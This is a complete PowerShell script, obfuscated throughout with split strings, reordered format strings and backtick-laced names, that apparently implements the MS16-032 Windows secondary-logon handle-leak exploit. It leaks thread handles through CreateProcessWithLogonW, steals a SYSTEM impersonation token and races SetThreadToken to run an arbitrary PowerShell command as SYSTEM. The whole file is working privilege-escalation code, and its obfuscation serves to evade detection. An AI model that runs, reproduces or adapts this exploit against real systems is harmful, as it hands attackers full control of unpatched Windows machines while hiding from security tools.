 Set-vAriABLe  ('oB'+'UZy6')  (  [type]("{0}{1}" -F 'nt','dlL') ) ; $ADjyZ =  [TyPE]("{1}{3}{0}{2}"-f 'En','SystEm.EnVIRoN','T','m') ; SEt-itEm ('vAr'+'i'+'AbLe:qoU'+'r') ([TyPe]("{1}{2}{0}{3}{4}" -f'Ac','R','UnSp','EfAcT','ory')  ) ;  Sv  ("3"+"5L")  (  [tYpE]("{0}{2}{1}"-f 'p','RShELl','owe')  ) ;  Set-IteM ("v"+"AriaBl"+"e:"+"UxQ3"+"mR")  (  [TypE]("{1}{2}{4}{3}{0}"-F'tCh','dIAGN','Os','tOpwA','tICs.S')  ) ; set-IteM  ('VARIABLE:'+'dq'+'3') (  [tYpE]("{8}{5}{7}{2}{0}{4}{6}{3}{9}{1}" -F'VI','shal','Ser','mA','CEs','STem.','.','RUNtIME.InterOP','sY','r')  );   $9H8=  [tYpe]("{2}{0}{1}"-F 't','r','INTP')  ;  SEt-IteM ("vaR"+"IAB"+"le:x"+"4i") ([TypE]("{1}{2}{0}" -F'apI32','Ad','v')  )  ;   Set-item varIabLe:o839 ( [TYPe]("{0}{1}" -f 'kerNEl','32') ) ; function I`NvO`K`e-Ms`16032 {

    [CmdletBinding()]
    param(

        [Parameter(poSITIon=0,maNDATOrY=${TR`UE})]
        [String]
        ${Co`MMAnD}
    )

    &("{0}{1}{2}" -f 'Add-','Typ','e') -TypeDefinition @"
    using System;
    using System.Diagnostics;
    using System.Runtime.InteropServices;
    using System.Security.Principal;
    
    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION
    {
        public IntPtr hProcess;
        public IntPtr hThread;
        public int dwProcessId;
        public int dwThreadId;
    }
    
    [StructLayout(LayoutKind.Sequential, CharSet=CharSet.Unicode)]
    public struct STARTUPINFO
    {
        public Int32 cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public Int32 dwX;
        public Int32 dwY;
        public Int32 dwXSize;
        public Int32 dwYSize;
        public Int32 dwXCountChars;
        public Int32 dwYCountChars;
        public Int32 dwFillAttribute;
        public Int32 dwFlags;
        public Int16 wShowWindow;
        public Int16 cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }
    
    [StructLayout(LayoutKind.Sequential)]
    public struct SQOS
    {
        public int Length;
        public int ImpersonationLevel;
        public int ContextTrackingMode;
        public bool EffectiveOnly;
    }
    
    public static class Advapi32
    {
        [DllImport("advapi32.dll", SetLastError=true, CharSet=CharSet.Unicode)]
        public static extern bool CreateProcessWithLogonW(
            String userName,
            String domain,
            String password,
            int logonFlags,
            String applicationName,
            String commandLine,
            int creationFlags,
            int environment,
            String currentDirectory,
            ref  STARTUPINFO startupInfo,
            out PROCESS_INFORMATION processInformation);
            
        [DllImport("advapi32.dll", SetLastError=true)]
        public static extern bool SetThreadToken(
            ref IntPtr Thread,
            IntPtr Token);
            
        [DllImport("advapi32.dll", SetLastError=true)]
        public static extern bool OpenThreadToken(
            IntPtr ThreadHandle,
            int DesiredAccess,
            bool OpenAsSelf,
            out IntPtr TokenHandle);
            
        [DllImport("advapi32.dll", SetLastError=true)]
        public static extern bool OpenProcessToken(
            IntPtr ProcessHandle, 
            int DesiredAccess,
            ref IntPtr TokenHandle);
            
        [DllImport("advapi32.dll", SetLastError=true)]
        public extern static bool DuplicateToken(
            IntPtr ExistingTokenHandle,
            int SECURITY_IMPERSONATION_LEVEL,
            ref IntPtr DuplicateTokenHandle);
    }
    
    public static class Kernel32
    {
        [DllImport("kernel32.dll")]
        public static extern uint GetLastError();
    
        [DllImport("kernel32.dll", SetLastError=true)]
        public static extern IntPtr GetCurrentProcess();
    
        [DllImport("kernel32.dll", SetLastError=true)]
        public static extern IntPtr GetCurrentThread();
        
        [DllImport("kernel32.dll", SetLastError=true)]
        public static extern int GetThreadId(IntPtr hThread);
        
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern int GetProcessIdOfThread(IntPtr handle);
        
        [DllImport("kernel32.dll",SetLastError=true)]
        public static extern int SuspendThread(IntPtr hThread);
        
        [DllImport("kernel32.dll",SetLastError=true)]
        public static extern int ResumeThread(IntPtr hThread);
        
        [DllImport("kernel32.dll", SetLastError=true)]
        public static extern bool TerminateProcess(
            IntPtr hProcess,
            uint uExitCode);
    
        [DllImport("kernel32.dll", SetLastError=true)]
        public static extern bool CloseHandle(IntPtr hObject);
        
        [DllImport("kernel32.dll", SetLastError=true)]
        public static extern bool DuplicateHandle(
            IntPtr hSourceProcessHandle,
            IntPtr hSourceHandle,
            IntPtr hTargetProcessHandle,
            ref IntPtr lpTargetHandle,
            int dwDesiredAccess,
            bool bInheritHandle,
            int dwOptions);
    }
    
    public static class Ntdll
    {
        [DllImport("ntdll.dll", SetLastError=true)]
        public static extern int NtImpersonateThread(
            IntPtr ThreadHandle,
            IntPtr ThreadToImpersonate,
            ref SQOS SecurityQualityOfService);
    }
"@
    
    function gET-`TH`R`EADHANdle {
        ${STa`RTuP`Info} = &("{2}{0}{1}"-f 'w-Ob','ject','Ne') ("{3}{2}{1}{0}" -f 'O','UPINF','RT','STA')
        ${St`ArtU`PiNfO}."dW`FL`Ags" = 0x00000100
        ${ST`ARtu`pi`Nfo}."hsTDINP`UT" =  (dir ("vARia"+"b"+"l"+"e:o839") ).vaLue::("{0}{3}{1}{2}"-f 'G','ntThre','ad','etCurre').Invoke()
        ${s`T`ARtuPI`NfO}."HstDout`p`Ut" =   $O839::("{2}{4}{0}{3}{1}" -f'tT','ad','GetCurr','hre','en').Invoke()
        ${sTa`R`T`UPINFO}."HsT`dE`RrOR" =  ( GEt-VaRIabLe  o839  ).vALUe::("{3}{1}{2}{0}" -f'hread','C','urrentT','Get').Invoke()
        ${STa`Rtu`piNFO}."c`B" =  (  get-iTeM  ("VaR"+"iAB"+"LE"+":DQ3")).vAlUe::("{0}{1}" -f'Siz','eOf').Invoke(${st`ArT`Up`InFo})
        
        ${proCessi`N`Fo} = &("{1}{0}{2}" -f'w-Obje','Ne','ct') ("{2}{0}{3}{4}{1}"-f'OCESS_I','TION','PR','NF','ORMA')
        ${GEtCu`RRE`NTPAtH} = (&("{0}{2}{1}"-f 'Get','em','-It') -Path ".\" -Verbose)."f`UlL`NaMe"
        
        ${CaL`LrE`suLt} =   ( Ls ("VaRi"+"A"+"bLE:x"+"4I") ).vALUE::("{0}{1}{4}{3}{2}"-f 'Create','Proc','gonW','hLo','essWit').Invoke(
            ("{0}{1}" -f'us','er'), ("{0}{1}"-f'doma','in'), ("{1}{0}" -f 's','pas'),
            0x00000002, ((("{1}{3}{2}{0}{6}{4}{5}"-f'0}System32{0}cm','C:{0}Wi','{','ndows','x','e','d.e'))  -f[ChAr]92), "",
            0x00000004, ${nu`ll}, ${gE`TcuR`RE`NtPA`TH},
            [ref]${S`TaRT`U`pinFO}, [ref]${PR`oCe`SsINfo})
        
        ${lPT`ArG`E`ThandlE} =   $9H8::"Z`Ero"
        ${cALlre`SU`LT} =  $o839::("{3}{1}{2}{0}{4}"-f'd','uplicateH','an','D','le').Invoke(
            ${Pr`OC`eS`SInFO}."hP`RO`CEss", 0x4,
             (  Ls ("vaRiab"+"L"+"e"+":o839")  ).ValUe::("{3}{1}{2}{0}{4}{5}" -f 'P','Curr','ent','Get','roc','ess').Invoke(),
            [ref]${L`pTarGET`Ha`NdLe}, 0, ${fa`LSe},
            0x00000002)
        
        ${CaL`L`Resu`lt} =  (  Get-VAriabLe  ("O83"+"9")).VAlUE::("{1}{3}{0}{2}{4}"-f'i','Ter','natePr','m','ocess').Invoke(${P`ROC`esSi`Nfo}."Hp`ROc`eSS", 1)
        ${cAl`lr`eSU`Lt} =   (  CHILDiTEM VaRiaBle:o839).vAlue::("{3}{0}{1}{2}" -f 'Han','d','le','Close').Invoke(${Proc`E`ss`inFO}."HPrO`c`EsS")
        ${ca`L`Lres`ULt} =   $o839::("{2}{1}{0}"-f'andle','oseH','Cl').Invoke(${prO`cesS`InfO}."h`ThRe`AD")
        
        ${lPtAr`Ge`THan`dle}
    }
    
    function Get`-`S`ysTe`mToKEN {
        &("{0}{4}{1}{2}{3}" -f'Write-','erb','os','e','V') ("`n[?] "+'Tryi'+'ng '+'thr'+'ead '+'handl'+'e'+': '+"$Thread")
        &("{2}{3}{0}{4}{1}" -f'e','bose','W','rite-V','r') "[?] Thread belongs to: $($(Get-Process -PID $([Kernel32]::GetProcessIdOfThread($Thread))).ProcessName) "
    
        ${CAlL`Re`su`lt} =   ( gET-ItEM variabLe:O839).VALUE::("{2}{0}{1}" -f'pen','dThread','Sus').Invoke(${t`Hr`EAD})
        if (${c`ALl`R`esuLt} -ne 0) {
            &("{1}{3}{0}{2}" -f '-Ver','Wr','bose','ite') ('['+'!] '+"$Thread "+'is'+' '+'a '+'bad'+' '+'t'+'hread'+', '+'mov'+'i'+'ng '+'o'+'n..')
            Return
        } &("{3}{0}{2}{1}"-f 'te','e','-Verbos','Wri') ("{1}{4}{2}{0}{3}" -f 'e','[+] Threa',' suspend','d','d')
        
        &("{1}{0}{3}{2}{4}" -f'e-','Writ','os','Verb','e') ("{4}{5}{9}{0}{10}{2}{6}{3}{7}{1}{8}"-f ' c','on ','rr',' impers','[>] Wip','i','ent','onati','token','ng','u')
        ${CAll`RESU`LT} =  (  gI variABLe:x4i  ).vAlue::"se`TTHrEAdT`o`Ken"([ref]${Thre`AD},   (ItEM  ("VARiab"+"l"+"e:9H"+"8") ).vaLue::"ZE`Ro")
        if (!${cALl`ReS`ULt}) {
            &("{3}{1}{2}{0}"-f 'bose','Ve','r','Write-') ("{0}{1}{7}{6}{8}{4}{5}{2}{3}"-f '[!] Set','Thr','g on','..','fa','iled, movin','adToken','e',' ')
            ${CalLr`es`ULT} =   ( iTeM  ("VaR"+"IaBl"+"E:O83"+"9") ).VAluE::("{3}{1}{2}{0}"-f 'd','Th','rea','Resume').Invoke(${T`hreAd})
            &("{2}{4}{1}{0}{3}"-f 'rbo','Ve','Wr','se','ite-') ("{0}{3}{2}{1}" -f '[+] Thread ','med!','esu','r')
            Return
        }
        
        &("{0}{1}{3}{4}{2}"-f'Writ','e','bose','-Ve','r') ("{5}{3}{6}{1}{4}{7}{2}{0}" -f 'oken','TE','mpersonation t','ldi','M','[>] Bui','ng SYS',' i')
        ${sQ`OS} = &("{0}{1}{2}" -f'New-Obj','ec','t') ("{0}{1}" -f'S','QOS')
        ${Sq`os}."i`M`PErsO`NatiO`NLeveL" = 2
        ${S`qOS}."leNg`Th" =  $Dq3::("{0}{1}"-f 'SizeO','f').Invoke(${s`qOS})
        ${C`AlLREsU`Lt} =   $ObUZy6::"nTIM`PErSONaTEt`H`R`eaD"(${tH`RE`AD}, ${T`h`REad}, [ref]${S`qos})
        if (${CA`llrE`SuLt} -ne 0) {
            &("{3}{0}{1}{2}" -f 'rite-Ve','rbo','se','W') ("{10}{3}{0}{7}{1}{2}{8}{5}{9}{6}{4}{11}"-f 'Im','erso','n','Nt','n','eThre','failed, movi','p','at','ad ','[!] ','g on..')
            ${Cal`lrE`sULt} =  (  GeT-VARiAbLE ("o"+"839")).VaLUE::("{1}{2}{0}" -f'Thread','Resu','me').Invoke(${THRE`AD})
            &("{1}{0}{2}"-f'te-','Wri','Verbose') ("{2}{5}{0}{3}{1}{4}"-f' Thr','d res','[+','ea','umed!',']')
            Return
        }
    
        ${Sc`RIpT:SYstO`Ken`H`A`NDle} =  ( iTeM  ('VARIAB'+'LE'+':9H8') ).VAlUe::"z`Ero"
        ${c`ALLres`UlT} =  $X4i::"oPENt`hr`eaD`TOkeN"(${T`H`READ}, 0x0006, ${fAL`Se}, [ref]${SyStO`k`enH`AnDLe})
        if (!${CaL`Lre`s`Ult}) {
            &("{2}{1}{0}"-f 'e-Verbose','rit','W') ("{1}{9}{4}{5}{10}{7}{3}{2}{6}{0}{8}"-f 'ving on.','[!] Open','d, m','e','oken ','f','o','l','.','ThreadT','ai')
            ${ca`ll`REsult} =   $o839::("{2}{1}{3}{0}" -f'Thread','e','R','sume').Invoke(${tHr`Ead})
            &("{2}{0}{1}"-f'te-','Verbose','Wri') ("{3}{1}{2}{0}" -f 'umed!','read',' res','[+] Th')
            Return
        }
        
        &("{2}{3}{1}{0}" -f 'ose','rb','W','rite-Ve') ('[?'+'] '+'Succe'+'ss,'+' '+'open'+' '+'S'+'YSTEM'+' '+'tok'+'en '+'han'+'dle: '+"$SysTokenHandle")
        &("{0}{3}{2}{1}"-f'Writ','ose','rb','e-Ve') ("{4}{0}{3}{2}{1}" -f'g','read..','h',' t','[+] Resumin')
        ${CaLlr`E`S`ULT} =   ( DIR  ('VArIaBl'+'E:o'+'839')).vaLue::("{2}{1}{3}{0}"-f'ead','esum','R','eThr').Invoke(${t`hRE`Ad})
    }
    
    ${ms`1`6032} = ((("{15}{52}{16}{13}{21}{58}{33}{59}{10}{48}{40}{46}{51}{53}{17}{39}{60}{35}{29}{38}{49}{20}{43}{1}{4}{8}{37}{62}{18}{47}{31}{6}{19}{57}{56}{41}{11}{0}{64}{26}{9}{12}{65}{54}{42}{24}{23}{28}{14}{3}{2}{22}{36}{55}{45}{30}{63}{7}{25}{50}{61}{32}{34}{44}{27}{5}" -f 'Z___WY','WYZ   ','  ','     ','  ','c]
iVw','Z','    ','WYZ_  WYZ_WYZ WYZ_WYZ','WYZ___WYZ','_ ','WYZ_WYZ_WYZ_WY','   WY','   ',' ','i','
 ','YZ  _W','W',' ','  WYZ
  ',' __ __ __','   ','YZ___W','W','  ','____','uzzySe','YZ
      ','   ','            
   ','WY','3','   _','f','WYZ___WYZ','    ',' ','WYZ_  W','YZ_  WYZ WYZ',' 
','
    ','Z___','  ',' -> @F','  ','    ','YZ WYZ WYZ_  ','    ___ ___ ___','YZ_','   [by b','WYZ  V ','Vw',' W','___WY','     ','Z',' _WY','_ ___','_','  _','3','. WYZ___','       ','Z_','Z'))-CrEplACe 'WYZ',[CHar]124-replACe  'iVw',[CHar]34)
    
    ${M`s160`32}
    
    &("{1}{3}{0}{2}" -f'o','Wri','se','te-Verb') "`n[?] Operating system core count: $([System.Environment]::ProcessorCount) "
    if ($(  (Get-vaRiABle  ('adj'+'yZ')).VALUe::"PrO`c`E`SSOrCoUNt") -lt 2) {
        ('['+'!] '+'This'+' '+'is'+' '+'a '+'VM'+' '+('i'+'snMxvt'+' ')."R`EPlaCe"('Mxv',[strINg][chaR]39)+'it'+', '+'ra'+'ce '+'c'+'o'+'ndition '+'r'+'equi'+'res '+'a'+'t '+'le'+'ast '+'2 '+'CP'+'U '+'c'+'ores, '+"exiting!`n")
        Return
    }
    
    ${t`hREa`Da`RrAy} = @()
    ${t`IDar`Ray} = @()
    
    &("{0}{1}{2}{3}"-f 'Wr','i','te','-Verbose') ("{1}{6}{9}{3}{7}{0}{4}{2}{8}{5}"-f ' CreateProce','[>] D','sWit','in','s','es..','uplic','g','hLogonW handl','at')
    for (${i}=0; ${i} -lt 500; ${I}++) {
        ${hTHRe`AD} = &("{3}{0}{1}{2}" -f'T','h','readHandle','Get-')
        ${h`Th`ReAdid} =   (VArIable ('O83'+'9') ).VALue::("{3}{1}{2}{0}" -f 'Id','et','Thread','G').Invoke(${H`ThRE`Ad})
        if (${t`Ida`RrAY} -notcontains ${h`THre`ADid}) {
            ${TID`AR`Ray} += ${h`Th`ReaDId}
            if (${ht`Hr`eAd} -ne 0) {
                ${T`HR`EAdar`RAy} += ${HtH`RE`AD}
            }
        }
    }
    
    if ($(${tHRe`A`dARR`AY}."LEN`G`TH") -eq 0) {
        ("{5}{9}{6}{8}{1}{2}{7}{0}{4}{3}" -f'aptur','w','ere ','ing!','ed, exit','[!','hr','c','ead handles ','] No valid t')
        Return
    } else {
        &("{2}{1}{0}{3}"-f'Ver','e-','Writ','bose') "[?] Done, got $($ThreadArray.length) thread handle(s)! "
        &("{3}{0}{1}{2}" -f'e-V','erbos','e','Writ') ("`n[?] "+'T'+'hr'+'ead '+'handl'+'e '+'list'+':')
    }
    
    &("{2}{0}{4}{3}{1}" -f'e-','e','Writ','erbos','V') ("`n[*] "+'Sniffi'+'n'+'g '+'o'+'ut '+'pr'+'ivil'+'ege'+'d '+'i'+'mper'+'so'+'nation '+'to'+'ken..')
    foreach (${t`H`Read} in ${thR`e`ADARR`Ay}){
    
        &("{2}{0}{1}{3}"-f '-','SystemToke','Get','n')
        
        &("{0}{2}{3}{1}"-f'W','Verbose','ri','te-') ("`n[*] "+'Sniff'+'ing'+' '+'out'+' '+'SY'+'STE'+'M '+'sh'+'el'+'l..')
        &("{1}{4}{2}{0}{3}"-f '-Ver','W','e','bose','rit') ("`n[>] "+'D'+'up'+'lic'+'ating '+'SY'+'STE'+'M '+'toke'+'n')
        ${hd`UplIc`ATE`ToK`EnHaNDle} =   (  VariaBlE 9h8 ).VALUe::"z`ErO"
        ${C`Al`l`REsULt} =  $x4i::"DupL`Ic`ATEtOK`EN"(${Sy`STOKENH`AnDLe}, 2, [ref]${HduPlIca`T`etOkeN`h`AND`lE})
        
        &("{2}{1}{3}{0}"-f'ose','-Ve','Write','rb') ("{3}{4}{2}{1}{0}{5}"-f 'rting','Sta',' ','[>',']',' token race')
        ${r`U`NsP`ACE} =  (  geT-chiLDitem ('Var'+'i'+'Able:QOu'+'r')).VALUe::("{1}{2}{3}{0}"-f'e','CreateRu','nsp','ac').Invoke()
        ${staRTTo`kEN`RACE} =   $35L::("{1}{0}"-f 'reate','C').Invoke()
        ${staR`TTo`K`ENrACe}."rUns`PAcE" = ${RUn`SP`ACE}
        ${r`Un`Space}.("{1}{0}" -f 'en','Op').Invoke()
        [void]${st`Ar`TTOke`NRAcE}.("{2}{0}{1}" -f'd','dScript','A').Invoke({
            Param (${TH`ReAd}, ${hD`UplICaT`etOK`enha`N`D`LE})
            while (${t`RUE}) {
                ${c`AlLr`EsULt} =  ( dIr  ("vArIA"+"b"+"lE:x4I")).VALue::"sEt`THrEAd`TOK`eN"([ref]${thre`AD}, ${hDup`LICat`eT`okenH`ANd`Le})
            }
        }).("{3}{2}{1}{0}" -f 'gument','Ar','d','Ad').Invoke(${tHRe`AD}).("{1}{2}{0}"-f'nt','Add','Argume').Invoke(${hduPl`icAt`eT`Oke`NHaNDLE})
        ${aSC`O`Bj} = ${stA`R`Ttoken`R`ACe}.("{1}{0}{2}"-f'inInvok','Beg','e').Invoke()
        
        &("{0}{2}{1}" -f'Wri','e-Verbose','t') ("{1}{0}{5}{2}{3}{4}"-f']','[>','r','ac','e',' Starting process ')
        ${saFE`G`Uard} =  $uXq3mr::("{0}{1}"-f'StartNe','w').Invoke()
        while (${saF`E`gUard}."ELaPsedmiL`L`Is`eC`oNds" -lt 10000) {
            ${sta`RTUp`iNfO} = &("{1}{2}{0}"-f 'ect','Ne','w-Obj') ("{3}{1}{2}{0}" -f 'O','RTUPIN','F','STA')
            
            ${StaRTU`Pi`N`Fo}."dwF`LA`gs" = 0x00000001
            ${stAR`T`UpI`NFo}."w`s`ho`WWinDow" = 0x00000000
            ${sTa`RtuPI`NFo}."C`B" =   (  ChiLDitEM  ('vARIABLe:'+'dq'+'3') ).VaLUe::("{1}{0}"-f 'f','SizeO').Invoke(${ST`A`RTUpin`Fo}) 

            ${pRO`ce`SsiNFO} = &("{1}{0}{2}"-f'w-O','Ne','bject') ("{1}{3}{0}{2}{4}"-f 'ESS_INFORMA','PRO','TIO','C','N')
            
            ${getCUr`REnTp`A`TH} = (&("{2}{1}{0}"-f 'm','et-Ite','G') -Path ".\" -Verbose)."FUl`L`NAME"
            
            ${CAllRe`s`Ult} =   (  itEm  ("vari"+"a"+"BLE"+":X4I") ).vALuE::("{5}{6}{3}{2}{1}{0}{4}" -f'o','g','WithLo','teProcess','nW','Cr','ea').Invoke(
                ("{1}{0}" -f'er','us'), ("{0}{1}" -f 'do','main'), ("{1}{0}"-f 's','pas'),
                0x00000002, "$Env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe", (' '+'-comm'+'a'+'nd '+"$Command"),
                0x00000004, ${N`ULL}, ${G`etcUrrentp`A`TH},
                [ref]${stAR`TU`piN`Fo}, [ref]${Pro`ces`S`InfO})
                
            ${H`ToK`EnHA`Ndle} =  $9H8::"Z`Ero"
            ${Ca`llrE`sULT} =   ( GEt-vaRIable  ('X'+'4I') -VaLUEoNL )::"oPeNpRoCeS`s`TO`K`EN"(${pR`O`C`eSSiNfO}."h`pro`ceSs", 0x28, [ref]${hTo`K`enha`NDLe})
            if (!${caL`L`REsUlT}) {
                ("`n[!] "+'H'+'oly '+'h'+'andle '+'leak'+' '+'Bat'+'ma'+'n, '+'w'+'e '+'ha'+'ve '+'a '+'SYSTE'+'M'+' '+"shell!!`n")
                ${CAL`lRE`SulT} =   $o839::("{1}{3}{0}{2}"-f'e','Re','Thread','sum').Invoke(${Proc`eS`S`INfO}."HT`HrE`AD")
                ${St`ARtTokeNRa`ce}.("{1}{0}" -f 'top','S').Invoke()
                ${saFe`Gu`ArD}.("{0}{1}" -f'St','op').Invoke()
                Return
            }
                
            ${caLlr`EsU`lT} =   (  gEt-CHIldITem  VaRIABle:O839 ).vALUE::("{1}{3}{4}{2}{0}"-f'rocess','Term','P','inat','e').Invoke(${p`Ro`CeS`SINfO}."HPro`cE`sS", 1)
            ${cAlL`ReSu`lT} =  $o839::("{1}{0}{2}"-f 'loseHa','C','ndle').Invoke(${PR`O`ceSsIn`FO}."H`prOC`eSs")
            ${callr`e`Su`lt} =  (GCi  vAriAblE:O839).VALue::("{2}{0}{1}" -f 'Hand','le','Close').Invoke(${Pr`ocEs`SINfO}."Ht`HrEad")
        }
        
        ${STa`RT`To`KEN`Race}.("{1}{0}" -f 'top','S').Invoke()
        ${sA`FE`GuarD}.("{0}{1}"-f 'S','top').Invoke()
    }
}